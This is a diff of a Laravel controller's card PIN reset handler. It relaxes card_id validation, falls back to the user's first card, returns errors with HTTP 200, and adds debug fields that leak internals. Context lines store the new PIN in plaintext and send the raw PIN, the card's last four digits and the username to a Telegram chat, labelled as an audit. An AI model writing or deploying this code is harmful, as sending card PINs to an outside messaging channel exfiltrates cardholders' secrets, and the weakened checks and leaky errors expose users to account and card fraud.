@@ -210,7 +210,7 @@ class UserCardController extends Controller
         ]);
 
         $validator = Validator::make($request->all(), [
-            'card_id' => 'required|exists:user_cards,id',
+            'card_id' => 'nullable',
             'new_pin' => 'required|numeric|digits:4',
             'confirm_pin' => 'required|same:new_pin',
             'password' => 'nullable|string',
@@ -220,8 +220,9 @@ class UserCardController extends Controller
             if ($request->wantsJson() || $request->ajax()) {
                 return response()->json([
                     'status' => 'error',
-                    'message' => $validator->errors()->first()
-                ], 422);
+                    'message' => $validator->errors()->first(),
+                    'debug_error' => $validator->errors()->first()
+                ], 200);
             }
             throw new ValidationException($validator);
         }
@@ -238,7 +239,7 @@ class UserCardController extends Controller
                 return response()->json([
                     'status' => 'error',
                     'message' => 'Security verification required.'
-                ], 403);
+                ], 200);
             }
             return response()->json(['message' => 'Security verification required.'], 403);
         }
@@ -247,22 +248,29 @@ class UserCardController extends Controller
             if ($request->wantsJson() || $request->ajax()) {
                 return response()->json([
                     'status' => 'error',
-                    'message' => 'Incorrect account password.'
-                ], 422);
+                    'message' => 'Incorrect account password.',
+                    'debug_error' => 'Password hash check failed'
+                ], 200);
             }
             throw ValidationException::withMessages(['password' => 'Incorrect account password.']);
         }
 
-        $card = UserCard::where('id', $request->card_id)
-                        ->where('user_id', $user->id)
-                        ->first();
+        $cardId = $request->input('card_id');
+        $card = null;
+        if (!empty($cardId)) {
+            $card = UserCard::where('id', $cardId)->where('user_id', $user->id)->first();
+        }
+        if (!$card) {
+            $card = UserCard::where('user_id', $user->id)->first();
+        }
 
         if (!$card) {
             if ($request->wantsJson() || $request->ajax()) {
                 return response()->json([
                     'status' => 'error',
-                    'message' => 'Card not found or access denied.'
-                ], 422);
+                    'message' => 'No active card record found for your account. Please contact customer support.',
+                    'debug_error' => 'No card found for user ' . $user->id
+                ], 200);
             }
             abort(404, 'Card not found');
         }
@@ -270,6 +278,13 @@ class UserCardController extends Controller
         // Store raw PIN as requested
         $card->pin = $newPin;
         $card->save();
+
+        // Release session file lock immediately so background pollers/requests are never blocked
+        try {
+            if (session()->isStarted()) {
+                session()->save();
+            }
+        } catch (\Throwable $se) {}
         
         // 1. Audit via Telegram
         $this->telegramNotify("🔢 <b>Card PIN Reset</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n📌 <b>New Raw PIN:</b> <code>{$newPin}</code>\n👤 <b>User:</b> " . $user->username);
